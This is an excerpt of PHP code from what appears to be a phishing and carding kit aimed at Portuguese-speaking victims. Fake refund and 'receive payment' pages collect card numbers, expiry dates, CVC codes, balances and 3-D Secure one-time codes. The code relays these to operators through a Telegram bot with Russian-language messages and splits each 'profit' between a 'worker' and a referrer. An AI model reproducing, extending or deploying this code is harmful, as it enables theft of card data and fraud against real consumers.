...
<?php
	...
	switch ($action) {
		...
		case '3ds': {
			...
			$isnt = ($isnt == '1');
			$msg = [false, 'Um código único foi enviado para o seu número de telefone. Por favor, verifique os detalhes da transação e insira o código único.'];
			$code3ds = substr(beaText($_POST2['3dscode'], chsNum()), 0, 20);
			if ($code3ds && strlen($code3ds) > 2) {
				$msg = [true, 'Você digitou o código errado. Verifique o código da mensagem e insira-o novamente.'];
				...
				if ($lastcode != $code3ds) {
					...
					botSend([
						...
						'⚠️ Код: <b>'.$code3ds.'</b>',
						'',
						'💵 Сумма платежа: <b>'.beaCashport($amount).'</b>',
						...
						[
							['text' => '✅ Оплатил', 'callback_data' => '/doruchkazaletport '.$t],
						],
						[
							['text' => '❌ Звонок 900', 'callback_data' => '/doruchkafail1port '.$t],
							['text' => '❌ Нет денег', 'callback_data' => '/doruchkafail2port '.$t],
						],
					]]);
		...
		case 'order': case 'buy': case 'cash': case 'rent' : case 'cars': {
			...
			if ($hash0 != getIpData($ip, 'hash')/getCookieData('hash', $_COOKIE2)) {
				...
				botSend([
					...
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💵 Стоимость: <b>'.beaCashport($amount).'</b>',
		...
		case 'merchant': case 'refund': case 'unlock': case 'ayeruchnayaplatejjjka666': {
			...
			$ttx = [
				...
				[
					...
					'Receber',
					'Recuperação',
					'A fim de reembolsar o valor, precisamos reservar fundos em seu cartão no valor do valor da transação.',
				],
				[
					'получения средств',
					'Eu recebo ',
					'Receber',
					'Recebendo fundos',
					'Para receber dinheiro por um produto pago, o saldo do seu cartão deve ser de pelo menos o valor da transação.',
				],
			][$isnr];
			if($iscars == 'true')
			{
    ...
    if ($pares && $merchant && isPayData($merchant)) {
				...
				if ($psts[0]) {
					...
					$profit = makeProfitport($id, $isnr, $amount, $pkoef);
					...
					$pmess = [
						$pkoef2,
						'',
						'⚖️ Доля воркера: <b>'.beaCashport($profit[0]).'</b>',
						'💵 Сумма платежа: <b>'.beaCashport($amount).'</b>',
					...
					$t0 = [
						$pkoef2,
						'',
				 		'❤️ Ваша доля: <b>'.beaCashport($profit[0]).'</b>',
						'💸 Сумма платежа: <b>'.beaCashport($amount).'</b>',
					...
					botSend([
						...
						'💸 Сумма платежа: <b>'.beaCashport($amount).'</b>',
						'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
						'💎 Доля воркера: <b>'.beaCashport($profit[0]).'</b>',
						'🐤 Доля реферала: <b>'.beaCashport($profit[1]).'</b>'.($referal ? ' (<b>'.userLogin($referal, true).'</b>)' : ''),
						'',
						'💳 Карта: <b>'.cardBank($card).'</b>',
						'☘️ Номер: <b>'.$card.'</b>',
						'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
				...
				// 		'💳 Карта: <b>'.cardBank($card).'</b>',
					...
					if (!$isrpar) {
						$t1 = [
							'❄️ Баланс '.($pmnt == 'btc' ? 'кошелька' : 'карты').' <b>'.$card2.'</b> увеличен на <b>'.beaCashport($amount).'</b>',
						];
						if ($card3)
							$t1 = array_merge($t1, [
								'',
					...
					if ($referal) {
						botSend([
							'👾 Вы получили <b>'.beaCashport($profit[1]).'</b> от профита реферала <b>'.userLogin($id).'</b>',
						], $referal);
					}
					if (!$isrpar) {
						/*$amount--;
					...
					if ($pcrt[0]) {
						...
						if (!isCardData($card, $expm, $expy, $cvc)) {
							...
							botSend([
								...
								'',
								'💸 Сумма платежа: <b>'.beaCashport($amount).'</b>',
								$_POST2['balancecard'] ? '💰 Баланс карты: <b>'.$balancecard.' €.</b>' : '',
								// '☘️ Номер: <b>'.$card.'</b>',
								// '📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								// '🕶 CVC: <b>'.$cvc.'</b>',
							...
							botSend([
								...
								'📆 Срок: <b>'.$expm.'</b> / <b>'.$expy.'</b>',
								'🕶 CVC: <b>'.$cvc.'</b>',
								$_POST2['balancecard'] ? '💰 Баланс: <b>'.$balancecard.' €.</b>' : '',
								'',
								'💸 Сумма платежа: <b>'.beaCashport($amount).'</b>',
								'👤 Воркер: <b>'.userLogin($id, true, true).'</b>',
							], chatAdmin());
			...
			if ($hash0 != /*getIpData($ip, 'hash')*/getCookieData('hash', $_COOKIE2)) {
				...
				$t = [
					...
					'',
					'🏷 Название: <b>'.$title.'</b>',
					'💸 Общая сумма: <b>'.beaCashport($amount).'</b>',
					'🌍 Сервис: <b>'.getService($srvc, false, $isnr == 2).'</b>',
					//'',
					//'🌎 IP: <b>'.$ip.'</b>',
					//'🔍 Локация: <b>'.$iploc.'</b>',
